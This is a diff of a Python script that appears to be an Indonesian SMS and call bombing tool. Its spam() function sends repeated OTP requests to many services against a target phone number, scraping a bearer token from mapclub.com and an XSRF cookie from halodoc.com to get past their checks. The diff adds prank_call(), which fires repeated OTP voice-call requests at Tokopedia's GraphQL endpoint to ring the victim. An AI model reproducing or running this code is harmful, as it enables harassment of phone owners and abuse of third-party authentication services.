@@ -7,16 +7,13 @@ COLORS = ["\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033
 LOADING = True
 
 def loading_loop():
-    bars = 10
-    i = 0
+    bars = 10; i = 0
     while LOADING:
-        filled = "♦" * i
-        empty = "░" * (bars - i)
+        filled = "♦" * i; empty = "░" * (bars - i)
         color = COLORS[i % len(COLORS)]
         sys.stdout.write(f"\r  [{color}{filled}{N}{empty}] ")
         sys.stdout.flush()
-        i = (i + 1) % (bars + 1)
-        time.sleep(0.2)
+        i = (i + 1) % (bars + 1); time.sleep(0.2)
     sys.stdout.write("\r" + " " * 40 + "\r")
 
 def spam(phone):
@@ -39,12 +36,9 @@ def spam(phone):
         if speed > 5: speed = 5
     except: speed = 3
     print(f"\n  {C}[*] Loop : {loop}x | Delay : {speed}s{N}\n")
-    sent = []
-    blocked = []
-    failed = []
+    sent = []; blocked = []; failed = []
     LOADING = True
-    t = threading.Thread(target=loading_loop)
-    t.start()
+    t = threading.Thread(target=loading_loop); t.start()
     for l in range(loop):
         el = _x(phone)
         for name, url, h, b in el:
@@ -52,19 +46,16 @@ def spam(phone):
             if b.pop("_mapclub", False):
                 try:
                     import requests as _rr, re
-                    s = _rr.Session()
-                    s.headers.update({"User-Agent": _u()})
+                    s = _rr.Session(); s.headers.update({"User-Agent": _u()})
                     r = s.get("https://www.mapclub.com", timeout=10)
                     match = re.search(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', r.text)
-                    if match:
-                        h["Authorization"] = f"Bearer {match.group(0)}"
+                    if match: h["Authorization"] = f"Bearer {match.group(0)}"
                     h["client-timestamp"] = str(int(time.time()*1000))
                 except: pass
             if b.pop("_halodoc", False):
                 try:
                     import requests as _rr, re
-                    s = _rr.Session()
-                    s.headers.update({"User-Agent": _u()})
+                    s = _rr.Session(); s.headers.update({"User-Agent": _u()})
                     r = s.get("https://www.halodoc.com/login", timeout=10)
                     xsrf = s.cookies.get("XSRF-TOKEN", "")
                     if not xsrf:
@@ -94,11 +85,33 @@ def spam(phone):
                 else: failed.append(name)
             except: failed.append(name)
             time.sleep(speed)
-    LOADING = False
-    t.join()
+    LOADING = False; t.join()
     sys.stdout.write("\r" + " " * 40 + "\r")
     print(f"\n  {G}=== HASIL ==={N}")
     if sent: print(f"  {G}✓ Terkirim ({len(sent)}): {', '.join(sent)}{N}")
     if blocked: print(f"  {Y}⊗ Diblokir ({len(blocked)}): {', '.join(blocked)}{N}")
     if failed: print(f"  {R}✗ Gagal ({len(failed)}): {', '.join(failed)}{N}")
+    input(f"\n  {W}[Enter] Kembali...{N}")
+
+def prank_call(phone):
+    print(f"\n  {C}[*] Target : {phone}{N}")
+    try:
+        count = int(input(f"  {C}[?] Jumlah panggilan (1-5): {N}").strip() or "3")
+        if count < 1: count = 1
+        if count > 5: count = 5
+    except: count = 3
+    print(f"\n  {C}[*] Nelpon {count}x via Tokopedia...{N}\n")
+    Q = "query OTPRequest($a:String!,$b:String,$c:String,$d:String,$e:Int){OTPRequest:OTPRequestV2(otpType:$a,mode:$b,msisdn:$c,email:$d,otpDigit:$e){success message}}"
+    url = "https://gql.tokopedia.com/graphql/OTPRequest"
+    for i in range(count):
+        try:
+            import requests as _rr
+            h = {"Content-Type":"application/json","Origin":"https://www.tokopedia.com","Referer":"https://www.tokopedia.com/login","tokopedia-lite":"otp","User-Agent":_u()}
+            b = {"operationName":"OTPRequest","query":Q,"variables":{"a":"116","b":"phone","c":phone[1:],"d":"","e":6}}
+            _rr.post(url, json=b, headers=h, timeout=15)
+            print(f"  [{i+1}/{count}] ✓ Memanggil...")
+        except:
+            print(f"  [{i+1}/{count}] ✗ Gagal")
+        time.sleep(5)
+    print(f"\n  {G}✓ Selesai.{N}")
     input(f"\n  {W}[Enter] Kembali...{N}")
